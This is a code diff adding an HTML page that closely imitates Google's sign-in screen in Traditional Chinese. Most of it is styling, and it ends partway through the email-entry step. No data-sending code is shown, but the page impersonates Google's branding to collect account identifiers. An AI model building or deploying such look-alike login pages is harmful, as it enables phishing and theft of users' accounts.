@@ -1,0 +1,1988 @@
+<!DOCTYPE html>
+<html lang="zh-TW">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>Sign in - Google Accounts</title>
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&family=Roboto:wght@400;500&display=swap">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@20..48,100..700,0,1">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background-color: #f0f4f8;
+            font-family: 'Google Sans', Roboto, Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+            transition: background-color 0.3s ease;
+        }
+        .login-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            max-width: 1030px;
+            width: 100%;
+        }
+        .login-wrapper {
+            display: flex;
+            flex-direction: row;
+            width: 100%;
+            background: #ffffff;
+            border-radius: 32px;
+            overflow: visible;
+            justify-content: space-between;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
+            height: 382px; 
+            min-height: 382px;
+            position: relative;
+            z-index: 1;
+            transition: background-color 0.3s ease;
+        }
+        #loadingOverlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(255, 255, 255, 0.65);
+            z-index: 20;
+            border-radius: 32px;
+            display: none;
+            pointer-events: none;
+        }
+        .loading-container {
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 4px;
+            z-index: 30;
+            overflow: visible;
+            border-radius: 32px 32px 0 0;
+            pointer-events: none;
+        }
+        .loading-track {
+            width: 100%;
+            height: 100%;
+            position: relative;
+            overflow: hidden;
+            border-radius: 32px 32px 0 0;
+            background: transparent;
+        }
+        .loading-segment {
+            position: absolute;
+            top: 0;
+            height: 100%;
+            background: #0957d0;
+            border-radius: 2px;
+            will-change: transform;
+            transform: translateX(-100%);
+            opacity: 1;
+            transition: opacity 0.15s ease;
+        }
+        .login-left {
+            flex: 0 0 38%;
+            background: #ffffff;
+            display: flex;
+            flex-direction: column;
+            padding: 36px 30px 32px 32px; 
+            justify-content: flex-start;
+            border-radius: 32px 0 0 32px;
+            position: relative;
+            z-index: 1;
+        }
+        .login-left .google-logo-svg {
+            margin-bottom: 24px;
+        }
+        .login-left .google-logo-svg img {
+            width: 40px;
+            height: 40px;
+            display: block;
+        }
+        .login-left h1 {
+            font-size: 44px; 
+            font-weight: 400;
+            color: #1f1f1f;
+            letter-spacing: 0.3px;
+            margin-bottom: 16px;
+            font-family: 'Google Sans', Roboto, Arial, sans-serif;
+        }
+        .login-left .sub-text {
+            font-size: 16px;
+            color: #444746;
+            font-family: 'Google Sans', Roboto, Arial, sans-serif;
+        }
+        .login-right {
+            flex: 0 0 50%;
+            background: #ffffff;
+            padding: 46px 32px 0 32px;
+            display: flex;
+            flex-direction: column;
+            justify-content: flex-start;
+            min-width: 0;
+            overflow: visible;
+            position: relative;
+            border-radius: 0 32px 32px 0;
+            z-index: 1;
+        }
+        .login-right form {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start; 
+            width: 100%;
+            max-width: 458px; 
+            margin-right: 0;
+            margin-left: auto;
+            height: 100%;
+            justify-content: flex-start;
+            position: relative;
+            overflow: visible;
+        }
+        .step {
+            display: flex;
+            flex-direction: column;
+            width: 100%;
+            height: 100%;
+            justify-content: flex-start;
+            position: absolute;
+            top: 0;
+            left: 0;
+            opacity: 0;
+            transform: translateX(30px);
+            pointer-events: none;
+            transition: opacity 0.5s cubic-bezier(0.23, 1, 0.32, 1), transform 0.5s cubic-bezier(0.23, 1, 0.32, 1);
+            padding-bottom: 10px;
+            overflow: visible;
+        }
+        .step.active {
+            opacity: 1;
+            transform: translateX(0);
+            pointer-events: auto;
+        }
+        .step.exit-left {
+            opacity: 0;
+            transform: translateX(-30px);
+        }
+        .step.exit-right {
+            opacity: 0;
+            transform: translateX(30px);
+        }
+        .form-group {
+            margin-bottom: 6px;
+            width: 100%;
+            flex-shrink: 0;
+        }
+        .form-group.step1-group {
+            margin-top: 70px; 
+        }
+        .form-group.step2-group {
+            margin-top: 70px;
+        }
+        .input-container {
+            width: 458px; 
+            position: relative;
+            margin-top: -5px;
+        }
+        .input-container input {
+            width: 100%;
+            height: 54px; 
+            padding: 16px 24px 8px 20px; 
+            font-size: 16px;
+            color: #1f1f1f;
+            background: #ffffff;
+            border: 1px solid #747775;
+            border-radius: 4px;
+            outline: none;
+            transition: border-color 0.2s, box-shadow 0.2s;
+            font-family: 'Google Sans', Roboto, Arial, sans-serif;
+        }
+        .input-container.error input {
+            border-color: #d93025 !important;
+            border-width: 1px !important;
+        }
+        .input-container.error input:focus {
+            border-color: #d93025 !important;
+            box-shadow: 0 0 0 2px rgba(217, 48, 37, 0.15) !important;
+        }
+
+        /* 浮动标签：边动边缩小，加速过渡 */
+        .floating-label {
+            position: absolute;
+            left: 16px; 
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 16px;
+            color: #444746;
+            pointer-events: none;
+            transition: top 0.12s cubic-bezier(0.4, 0, 0.2, 1), 
+                        font-size 0.12s cubic-bezier(0.4, 0, 0.2, 1), 
+                        color 0.12s cubic-bezier(0.4, 0, 0.2, 1),
+                        background 0.12s cubic-bezier(0.4, 0, 0.2, 1);
+            font-family: 'Google Sans', Roboto, Arial, sans-serif;
+            background: #ffffff;
+            padding: 0 4px;
+            opacity: 1;
+            z-index: 2;
+            line-height: 1.2;
+            white-space: nowrap;
+        }
+
+        .input-container input:focus~.floating-label,
+        .input-container input:not(:placeholder-shown)~.floating-label {
+            top: -7px;
+            transform: translateY(0);
+            font-size: 12px;
+            color: #0b57d0;
+            opacity: 1;
+            background: #ffffff;
+            padding: 0 4px;
+        }
+
+        .input-container input:not(:placeholder-shown):not(:focus)~.floating-label {
+            color: #444746;
+            opacity: 1;
+            top: -7px;
+            transform: translateY(0);
+            font-size: 12px;
+            background: #ffffff;
+            padding: 0 4px;
+        }
+        .input-container.error input:focus~.floating-label {
+            color: #d93025 !important;
+        }
+        .input-container.error input:not(:focus)~.floating-label {
+            color: #444746 !important;
+        }
+        .input-container input:focus {
+            border-color: #0b57d0;
+            border-width: 2px;
+            box-shadow: none;
+        }
+        .input-container input:not(:placeholder-shown):not(:focus) {
+            border-color: #747775;
+            border-width: 1px;
+        }
+        .error-message {
+            display: none;
+            align-items: center;
+            gap: 8px;
+            margin-top: 8px;
+            font-size: 14px;
+            color: #d93025;
+            font-family: 'Google Sans', Roboto, Arial, sans-serif;
+            font-weight: 400;
+        }
+        .error-message.visible {
+            display: flex;
+        }
+        .error-message .error-icon {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+            width: 16px;
+            height: 16px;
+            color: #d93025;
+        }
+        .error-message .error-icon svg {
+            width: 16px;
+            height: 16px;
+            fill: currentColor;
+        }
+        
+        .forgot-email-link {
+            display: inline-block;
+            margin-top: 6px; 
+            margin-left: -8px; 
+            padding: 4px 8px;
+            font-size: 14px;
+            font-weight: 500;
+            color: #0b57d0;
+            text-decoration: none;
+            font-family: 'Google Sans', Roboto, Arial, sans-serif;
+            transition: background 0.2s;
+            border-radius: 20px;
+            cursor: pointer;
+        }
+        .forgot-email-link:hover {
+            background: rgba(11, 87, 208, 0.08);
+            text-decoration: none;
+        }
+
+        .create-account-link {
+            font-size: 14px;
+            font-weight: 400; 
+            color: #0b57d0;
+            text-decoration: none;
+            font-family: 'Google Sans', Roboto, Arial, sans-serif;
+            transition: background 0.2s;
+            padding: 8px 16px;
+            border-radius: 20px;
+            white-space: nowrap;
+            cursor: pointer;
+            display: inline-block;
+        }
+        .create-account-link:hover {
+            background: rgba(11, 87, 208, 0.08);
+        }
+        .forgot-link {
+            font-size: 14px;
+            font-weight: 500;
+            color: #0b57d0;
+            text-decoration: none;
+            letter-spacing: 0.2px;
+            font-family: 'Google Sans', Roboto, Arial, sans-serif;
+            padding: 8px 16px;
+            border-radius: 20px;
+            transition: background 0.2s;
+            white-space: nowrap;
+            cursor: pointer;
+        }
+        .forgot-link:hover {
+            background: rgba(11, 87, 208, 0.08);
+            text-decoration: none;
+        }
+        .show-password-btn {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            margin-top: 4px;
+            font-size: 14px;
+            font-weight: 500;
+            color: #1f1f1f;
+            cursor: pointer;
+            padding: 4px 12px 4px 4px;
+            background: none;
+            border: none;
+            border-radius: 4px;
+            font-family: 'Google Sans', Roboto, Arial, sans-serif;
+            user-select: none;
+            transition: background 0.2s;
+            background: transparent;
+            box-shadow: none;
+            outline: none;
+        }
+        .show-password-btn:hover {
+            background: rgba(0, 0, 0, 0.04);
+        }
+        .VfPpkd-YQoJzd {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            width: 20px;
+            height: 20px;
+            position: relative;
+            flex-shrink: 0;
+            cursor: pointer;
+        }
+        .VfPpkd-HUofsb {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 20px;
+            height: 20px;
+            border: 2px solid #747775;
+            border-radius: 4px;
+            background: #ffffff;
+            transition: all 0.2s ease;
+            box-sizing: border-box;
+        }
+        .VfPpkd-HUofsb-Jt5cK {
+            stroke: #ffffff;
+            stroke-width: 3;
+            stroke-dasharray: 30;
+            stroke-dashoffset: 30;
+            transition: stroke-dashoffset 0.25s ease;
+            fill: none;
+        }
+        .VfPpkd-YQoJzd.checked .VfPpkd-HUofsb {
+            background: #0b57d0;
+            border-color: #0b57d0;
+        }
+        .VfPpkd-YQoJzd.checked .VfPpkd-HUofsb-Jt5cK {
+            stroke-dashoffset: 0;
+        }
+        .VfPpkd-SJnn3d {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            background: transparent;
+            transition: background 0.2s;
+            pointer-events: none;
+        }
+        .VfPpkd-YQoJzd:hover .VfPpkd-SJnn3d {
+            background: rgba(11, 87, 208, 0.08);
+        }
+        .VfPpkd-YQoJzd:active .VfPpkd-SJnn3d {
+            background: rgba(11, 87, 208, 0.16);
+        }
+        .show-password-btn .btn-label {
+            line-height: 1.4;
+        }
+        .actions-row {
+            display: flex;
+            justify-content: flex-end;
+            align-items: center;
+            margin-top: auto;
+            width: 100%;
+            padding-top: 12px;
+            padding-bottom: 24px;
+            flex-shrink: 0;
+            min-height: 40px;
+            position: relative;
+            gap: 0;
+        }
+        .actions-row.step1-actions {
+            justify-content: flex-end;
+        }
+        #step2 .actions-row {
+            gap: 23px;
+        }
+        .create-account-wrapper {
+            position: relative;
+            display: inline-block;
+            margin-right: 16px;
+            z-index: 10;
+        }
+        .create-dropdown {
+            position: absolute;
+            top: calc(100% + 4px);
+            right: 0;
+            background: #ffffff;
+            border-radius: 16px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.18);
+            min-width: 220px;
+            padding: 8px 0;
+            display: none;
+            z-index: 10;
+            border: 1px solid #e8eaed;
+            opacity: 0;
+            transform: scale(0.96) translateY(-4px);
+            transform-origin: top right;
+            transition: opacity 0.18s ease, transform 0.18s ease;
+            pointer-events: none;
+        }
+        .create-dropdown.open {
+            display: block;
+            opacity: 1;
+            transform: scale(1) translateY(0);
+            pointer-events: auto;
+        }
+        .create-dropdown .dropdown-item {
+            display: block;
+            width: 100%;
+            padding: 10px 20px;
+            font-family: 'Google Sans', Roboto, Arial, sans-serif;
+            font-size: 14px;
+            font-weight: 400;
+            color: #1f1f1f;
+            background: transparent;
+            border: none;
+            text-align: left;
+            cursor: pointer;
+            transition: background 0.15s;
+            letter-spacing: 0.2px;
+            line-height: 1.4;
+            text-decoration: none;
+        }
+        .create-dropdown .dropdown-item:hover {
+            background: #f1f3f4;
+        }
+        .create-dropdown .dropdown-item:active {
+            background: #e8eaed;
+        }
+        .btn-next {
+            background: #0b57d0;
+            border: none;
+            color: white;
+            font-size: 14px;
+            font-weight: 500;
+            padding: 12px 24px;
+            border-radius: 20px;
+            cursor: pointer;
+            transition: background 0.2s;
+            font-family: 'Google Sans', Roboto, Arial, sans-serif;
+            white-space: nowrap;
+            flex-shrink: 0;
+            box-shadow: none;
+        }
+        .btn-next:hover {
+            background: rgb(187, 207, 247);
+            color: #0b57d0; 
+        }
+        .btn-next:active {
+            background: #0a4280;
+        }
+        .btn-next:disabled {
+            opacity: 0.6;
+            cursor: default;
+            pointer-events: none;
+        }
+        
+        /* 底部連結與語言選擇器 */
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-between;
+            align-items: center;
+            width: 100%;
+            margin-top: 16px;
+            padding: 0 8px;
+            font-size: 12px; 
+            font-weight: 400;
+            color: #444746;
+            font-family: 'Google Sans', Roboto, Arial, sans-serif;
+            position: relative;
+            z-index: 20;
+            transition: opacity 0.25s ease, visibility 0.25s ease;
+        }
+        .lang-selector {
+            display: flex;
+            align-items: center;
+            gap: 4px;
+            color: #444746;
+            position: relative;
+            cursor: pointer;
+            padding: 4px 8px;
+            border-radius: 20px;
+            transition: background 0.2s;
+            user-select: none;
+            background: transparent;
+            font-size: 12px;
+            font-weight: 400;
+        }
+        .lang-selector:hover {
+            background: rgba(0, 0, 0, 0.04);
+        }
+        .lang-selector .lang-label {
+            font-weight: 400;
+            color: #444746;
+            font-size: 12px;
+        }
+        .lang-selector .lang-arrow-icon {
+            color: #444746;
+            display: flex;
+            align-items: center;
+            font-size: 16px; 
+        }
+        .lang-selector .lang-arrow-icon.open {
+            transform: rotate(180deg);
+        }
+        .lang-dropdown {
+            position: absolute;
+            bottom: calc(100% + 6px);
+            left: 0;
+            background: #ffffff;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            box-shadow: 0 4px 14px rgba(0, 0, 0, 0.12);
+            max-height: 280px;
+            overflow-y: auto;
+            min-width: 220px;
+            z-index: 1000;
+            display: none;
+            padding: 6px 0;
+        }
+        .lang-dropdown.open {
+            display: block;
+        }
+        .lang-dropdown .lang-item {
+            padding: 8px 20px;
+            font-size: 13px;
+            color: #1f1f1f;
+            cursor: pointer;
+            transition: background 0.15s;
+            font-weight: 400;
+            white-space: nowrap;
+        }
+        .lang-dropdown .lang-item:hover {
+            background: #f1f3f4;
+        }
+        .lang-dropdown .lang-item.selected {
+            background: rgba(11, 87, 208, 0.08);
+            color: #0b57d0;
+            font-weight: 500;
+        }
+        .lang-dropdown::-webkit-scrollbar {
+            width: 6px;
+        }
+        .lang-dropdown::-webkit-scrollbar-track {
+            background: #f1f1f1;
+            border-radius: 4px;
+        }
+        .lang-dropdown::-webkit-scrollbar-thumb {
+            background: #c1c7cd;
+            border-radius: 4px;
+        }
+        .lang-dropdown::-webkit-scrollbar-thumb:hover {
+            background: #a8aeb6;
+        }
+        .footer-right {
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+        .footer-right a {
+            color: #444746;
+            text-decoration: none;
+            font-weight: 400;
+            font-size: 12px; 
+            padding: 4px 8px;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        .footer-right a:hover {
+            background: rgba(0, 0, 0, 0.04);
+            text-decoration: none;
+        }
+        .user-profile-btn {
+            display: none;
+            align-items: center;
+            gap: 6px;
+            border: 1px solid #747775;
+            border-radius: 20px;
+            padding: 2px 10px 2px 2px;
+            width: fit-content;
+            background: #ffffff;
+            cursor: pointer;
+            transition: background 0.2s, opacity 0.4s ease, transform 0.4s ease;
+            text-decoration: none;
+            margin-top: 4px;
+            opacity: 0;
+            transform: translateY(-10px);
+        }
+        .user-profile-btn.visible {
+            display: inline-flex;
+            opacity: 1;
+            transform: translateY(0);
+        }
+        .user-profile-btn:hover {
+            background: #f1f3f4;
+        }
+        .user-avatar {
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            flex-shrink: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: #ffffff;
+        }
+        .user-avatar svg {
+            width: 24px;
+            height: 24px;
+            display: block;
+        }
+        .user-email {
+            font-size: 13px;
+            color: #1f1f1f;
+            font-weight: 500;
+            letter-spacing: 0.2px;
+            white-space: nowrap;
+            font-family: 'Google Sans', Roboto, Arial, sans-serif;
+        }
+        .dropdown-arrow {
+            color: #444746;
+            display: flex;
+            align-items: center;
+        }
+        .dropdown-arrow .material-symbols-outlined {
+            font-size: 18px;
+        }
+        .google-logo-svg img {
+            vertical-align: middle;
+        }
+
+        /* 手機版排版 */
+        @media (max-width: 680px) {
+            html, body {
+                overflow: hidden;
+                height: 100dvh;
+                width: 100vw;
+                position: fixed;
+                top: 0;
+                left: 0;
+            }
+            body {
+                padding: 0;
+                background-color: #ffffff;
+                align-items: flex-start;
+            }
+
+            .login-container {
+                max-width: 100%;
+                padding: 0 24px;
+                margin-top: 0;
+                height: 100dvh;
+                display: flex;
+                flex-direction: column;
+            }
+
+            .login-wrapper {
+                flex-direction: column;
+                border-radius: 0;
+                justify-content: flex-start;
+                height: 100%;
+                min-height: auto;
+                box-shadow: none;
+                background: transparent;
+                padding-top: 30px;
+            }
+
+            .login-left {
+                flex: 0 0 auto;
+                padding: 0 0 24px 0;
+                min-height: auto;
+                border-bottom: none;
+                justify-content: flex-start;
+                border-radius: 0;
+                background: transparent;
+            }
+
+            .login-left .google-logo-svg {
+                margin-bottom: 24px;
+            }
+
+            .login-left .google-logo-svg img {
+                width: 40px;
+                height: 40px;
+            }
+
+            .login-left h1 {
+                font-size: 44px;
+                font-weight: 400;
+                color: #1f1f1f;
+                letter-spacing: 0.3px;
+                margin-bottom: 12px;
+            }
+
+            .login-left .sub-text {
+                font-size: 16px;
+                color: #444746;
+            }
+
+            .login-right {
+                flex: 1 1 auto;
+                width: 100%;
+                padding: 0;
+                align-items: stretch;
+                justify-content: flex-start;
+                min-height: auto;
+                margin-left: 0;
+                overflow: visible;
+                border-radius: 0;
+                background: transparent;
+            }
+
+            .login-right form {
+                max-width: 100%;
+                margin-left: 0;
+                margin-right: 0;
+                height: 100%;
+                justify-content: flex-start;
+                position: relative;
+            }
+
+            .form-group.step1-group,
+            .form-group.step2-group {
+                margin-top: 32px;
+            }
+
+            .input-container {
+                width: 100%;
+                margin-left: 0;
+                margin-top: 0; 
+            }
+
+            .input-container input {
+                height: 56px;
+                font-size: 16px;
+                padding: 20px 16px 8px 16px; 
+                border-width: 1px;
+                border-radius: 4px;
+                border-color: #747775;
+                background: transparent;
+            }
+
+            .input-container input:focus {
+                border-width: 2px;
+                border-color: #0b57d0;
+            }
+
+            .floating-label {
+                font-size: 16px;
+                left: 12px;
+                padding: 0 4px;
+                background: transparent;
+                color: #444746;
+            }
+
+            .input-container input:focus~.floating-label,
+            .input-container input:not(:placeholder-shown)~.floating-label {
+                top: -10px; 
+                font-size: 14px;
+                padding: 0 5px;
+                background: #ffffff; 
+                color: #0b57d0;
+            }
+
+            .input-container input:not(:placeholder-shown):not(:focus)~.floating-label {
+                color: #444746;
+                background: #ffffff;
+                top: -10px;
+                font-size: 14px;
+                padding: 0 5px;
+            }
+
+            .actions-row {
+                flex-direction: row;
+                justify-content: space-between;
+                align-items: center;
+                margin-top: 32px;
+                padding-top: 0;
+                padding-bottom: 24px;
+                min-height: auto;
+                gap: 12px !important;
+            }
+
+            .actions-row.step1-actions {
+                flex-direction: row;
+                justify-content: space-between;
+                align-items: center;
+            }
+
+            #step2 .actions-row {
+                flex-direction: row;
+                justify-content: space-between;
+                align-items: center;
+                gap: 12px !important;
+            }
+
+            .create-account-wrapper {
+                margin-right: 0;
+                width: auto;
+                text-align: left;
+            }
+
+            .create-account-link {
+                display: inline-block;
+                padding: 8px 0;
+                font-size: 14px;
+            }
+
+            .forgot-link {
+                text-align: left;
+                padding: 8px 0;
+                font-size: 14px;
+            }
+
+            .btn-next {
+                width: auto;
+                justify-content: center;
+                padding: 12px 24px;
+                border-radius: 20px;
+                font-size: 14px;
+                min-width: 90px;
+            }
+
+            .footer-links {
+                flex-direction: row;
+                align-items: center;
+                justify-content: space-between;
+                gap: 4px;
+                margin-top: auto;
+                font-size: 12px;
+                padding: 16px 0 24px 0;
+                flex-wrap: wrap;
+                border-top: none; 
+            }
+
+            .footer-right {
+                flex-wrap: wrap;
+                gap: 0;
+            }
+
+            .footer-right a {
+                font-size: 12px;
+                padding: 4px 8px;
+            }
+
+            .lang-selector {
+                padding: 4px 0;
+            }
+
+            .lang-dropdown {
+                left: 0;
+                right: auto;
+                min-width: 180px;
+                bottom: calc(100% + 4px);
+            }
+
+            .show-password-btn {
+                font-size: 14px;
+                gap: 8px;
+                padding: 4px 8px 4px 4px;
+            }
+
+            .VfPpkd-YQoJzd {
+                width: 20px;
+                height: 20px;
+            }
+
+            .VfPpkd-HUofsb {
+                width: 20px;
+                height: 20px;
+            }
+
+            .user-profile-btn {
+                padding: 4px 12px 4px 4px;
+                gap: 6px;
+                border-radius: 20px;
+                margin-top: 8px;
+            }
+
+            .user-avatar {
+                width: 24px;
+                height: 24px;
+            }
+
+            .user-avatar svg {
+                width: 24px;
+                height: 24px;
+            }
+
+            .user-email {
+                font-size: 13px;
+            }
+
+            .dropdown-arrow .material-symbols-outlined {
+                font-size: 18px;
+            }
+
+            .loading-container {
+                border-radius: 0;
+                height: 3px;
+            }
+
+            .loading-track {
+                border-radius: 0;
+            }
+
+            #loadingOverlay {
+                border-radius: 0;
+                background: rgba(255, 255, 255, 0.7);
+            }
+
+            .forgot-email-link {
+                padding: 4px 0;
+                border-radius: 0;
+                font-size: 14px;
+                margin-left: 0; 
+                margin-top: 8px; 
+            }
+
+            .create-account-link {
+                padding: 4px 0;
+                border-radius: 0;
+                font-size: 14px;
+            }
+
+            .forgot-link {
+                padding: 4px 0;
+                border-radius: 0;
+                font-size: 14px;
+            }
+
+            .create-dropdown {
+                left: 0;
+                right: auto;
+                min-width: 200px;
+                top: calc(100% + 4px);
+                bottom: auto;
+                border-radius: 12px;
+                transform-origin: top left;
+            }
+
+            .login-wrapper,
+            .login-left,
+            .login-right {
+                border-radius: 0 !important;
+                box-shadow: none !important;
+            }
+        }
+
+        /* 深色模式 */
+        @media (prefers-color-scheme: dark) {
+            body {
+                background-color: rgb(30, 31, 32); 
+            }
+            .login-wrapper {
+                background: rgb(14, 14, 14); 
+            }
+            .login-left {
+                background: rgb(14, 14, 14);
+            }
+            .login-left h1 {
+                color: #e3e3e3;
+            }
+            .login-left .sub-text {
+                color: #ffffff;
+            }
+            .login-right {
+                background: rgb(14, 14, 14);
+            }
+            .login-right form {
+                background: rgb(14, 14, 14);
+            }
+            .input-container input {
+                color: #e3e3e3;
+                background: transparent;
+                border-color: #8e918f;
+            }
+            .input-container input:focus {
+                border-color: #a8c7fa;
+                box-shadow: none;
+            }
+            .floating-label {
+                color: #c4c7c5;
+                background: rgb(14, 14, 14); 
+            }
+            .input-container input:focus~.floating-label,
+            .input-container input:not(:placeholder-shown)~.floating-label {
+                color: #a8c7fa;
+                background: rgb(14, 14, 14);
+            }
+            .input-container input:not(:placeholder-shown):not(:focus)~.floating-label {
+                color: #c4c7c5;
+                background: rgb(14, 14, 14);
+            }
+            .error-message {
+                color: #f2b8b5;
+            }
+            .error-message .error-icon {
+                color: #f2b8b5;
+            }
+            .forgot-email-link {
+                color: #a8c7fa;
+            }
+            .forgot-email-link:hover {
+                background: rgba(168, 199, 250, 0.08);
+                text-decoration: none;
+            }
+            .create-account-link {
+                color: #a8c7fa;
+            }
+            .create-account-link:hover {
+                background: rgba(168, 199, 250, 0.08);
+            }
+            .forgot-link {
+                color: #a8c7fa;
+            }
+            .forgot-link:hover {
+                background: rgba(168, 199, 250, 0.08);
+            }
+            .show-password-btn {
+                color: #e3e3e3;
+            }
+            .show-password-btn:hover {
+                background: rgba(255, 255, 255, 0.08);
+            }
+            .VfPpkd-HUofsb {
+                border-color: #8e918f;
+                background: transparent;
+            }
+            .VfPpkd-YQoJzd.checked .VfPpkd-HUofsb {
+                background: #a8c7fa;
+                border-color: #a8c7fa;
+            }
+            .VfPpkd-YQoJzd.checked .VfPpkd-HUofsb-Jt5cK {
+                stroke: rgb(14, 14, 14);
+            }
+            .VfPpkd-YQoJzd:hover .VfPpkd-SJnn3d {
+                background: rgba(168, 199, 250, 0.08);
+            }
+            .btn-next {
+                background: #a8c7fa;
+                color: rgb(14, 14, 14);
+            }
+            .btn-next:hover {
+                background: rgb(187, 207, 247);
+                color: rgb(14, 14, 14);
+            }
+            .btn-next:active {
+                background: #e8f0fe;
+            }
+            
+            .footer-links {
+                color: #ffffff;
+            }
+            .lang-selector {
+                color: #ffffff;
+                background: transparent;
+            }
+            .lang-selector:hover {
+                background: rgba(255, 255, 255, 0.08);
+            }
+            .lang-selector .lang-label {
+                color: #ffffff;
+                font-weight: 400;
+            }
+            .lang-selector .lang-arrow-icon {
+                color: #ffffff;
+            }
+            .footer-right a {
+                color: #ffffff;
+                font-weight: 400;
+            }
+            .footer-right a:hover {
+                background: rgba(255, 255, 255, 0.08);
+            }
+            
+            .user-profile-btn {
+                border-color: #8e918f;
+                background: rgb(14, 14, 14);
+            }
+            .user-profile-btn:hover {
+                background: rgba(255, 255, 255, 0.08);
+            }
+            .user-email {
+                color: #e3e3e3;
+            }
+            .dropdown-arrow {
+                color: #c4c7c5;
+            }
+            .user-avatar {
+                background: rgb(14, 14, 14);
+            }
+            .user-avatar svg path {
+                fill: #c4c7c5;
+            }
+            .create-dropdown {
+                background: #1f1f1f;
+                border-color: #444746;
+            }
+            .create-dropdown .dropdown-item {
+                color: #e3e3e3;
+            }
+            .create-dropdown .dropdown-item:hover {
+                background: #333537;
+            }
+            .lang-dropdown {
+                background: #1f1f1f;
+                border-color: #444746;
+            }
+            .lang-dropdown .lang-item {
+                color: #e3e3e3;
+            }
+            .lang-dropdown .lang-item:hover {
+                background: #333537;
+            }
+            .lang-dropdown .lang-item.selected {
+                background: rgba(168, 199, 250, 0.12);
+                color: #a8c7fa;
+            }
+            #loadingOverlay {
+                background: rgba(0, 0, 0, 0.7);
+            }
+            .loading-segment {
+                background: #a8c7fa;
+            }
+            /* 手機版深色背景 */
+            @media (max-width: 680px) {
+                body {
+                    background-color: rgb(14, 14, 14); 
+                }
+                .login-wrapper {
+                    background: transparent;
+                }
+                .login-left {
+                    background: transparent;
+                }
+                .login-right {
+                    background: transparent;
+                }
+                .login-right form {
+                    background: transparent;
+                }
+                .footer-links {
+                    border-top: none; 
+                }
+                .login-left h1 {
+                    color: #e3e3e3;
+                }
+                .login-left .sub-text {
+                    color: #ffffff;
+                }
+                .input-container input {
+                    background: transparent;
+                }
+                .floating-label {
+                    background: transparent;
+                }
+                
+                .input-container input:focus~.floating-label,
+                .input-container input:not(:placeholder-shown)~.floating-label {
+                    background: rgb(14, 14, 14);
+                }
+                .input-container input:not(:placeholder-shown):not(:focus)~.floating-label {
+                    background: rgb(14, 14, 14);
+                }
+                
+                .footer-right a {
+                    color: #ffffff;
+                }
+                .lang-selector {
+                    padding: 4px 0;
+                    background: transparent;
+                }
+                .lang-selector:hover {
+                    background: transparent; 
+                }
+                .lang-selector .lang-label {
+                    color: #ffffff;
+                }
+                .lang-selector .lang-arrow-icon {
+                    color: #ffffff;
+                }
+                .forgot-email-link:hover {
+                    background: transparent;
+                    text-decoration: underline;
+                }
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="login-wrapper">
+            <div id="loadingOverlay"></div>
+            <div class="loading-container" id="loadingContainer">
+                <div class="loading-track" id="loadingTrack"></div>
+            </div>
+            <div class="login-left">
+                <div class="google-logo-svg">
+                    <img src="https://www.gstatic.com/images/branding/googleg_gradient/svg/googleg_gradient_standard_48px.svg" alt="Google" width="40" height="40">
+                </div>
+                <h1 id="leftTitle">登入</h1>
+                <div class="sub-text" id="leftSubtext">使用您的 Google 帳戶</div>
+                <a href="#" class="user-profile-btn" id="userProfileBtn">
+                    <div class="user-avatar">
+                        <svg viewBox="0 0 24 24" fill="none" xmlns="https://www.w3.org/2000/svg">
+                            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z" fill="#5f6368"/>
+                        </svg>
+                    </div>
+                    <span class="user-email" id="displayedEmail"></span>
+                    <span class="dropdown-arrow">
+                        <span class="material-symbols-outlined">arrow_drop_down</span>
+                    </span>
+                </a>
+            </div>
+            <div class="login-spacer"></div>
+            <div class="login-right">
+                <form onsubmit="return false;">
+                    <div class="step active" id="step1">
+                        <div class="form-group step1-group">
+                            <div class="input-container" id="inputContainer">
+                                <input type="email" placeholder=" " id="emailInput" autofocus>
+                                <span class="floating-label">電子郵件地址或電話號碼</span>
+                            </div>
+                            <div class="error-message" id="errorMessage">
+                                <span class="error-icon">
+                                    <svg aria-hidden="true" fill="currentColor" focusable="false" width="16px" height="16px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg">
+                                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path>
+                                    </svg>
+                                </span>
+                                <span>請輸入電子郵件地址或電話號碼</span>
+                            </div>
+                            <a href="#" class="forgot-email-link" onclick="return false;">忘記電子郵件地址？</a>
+                        </div>
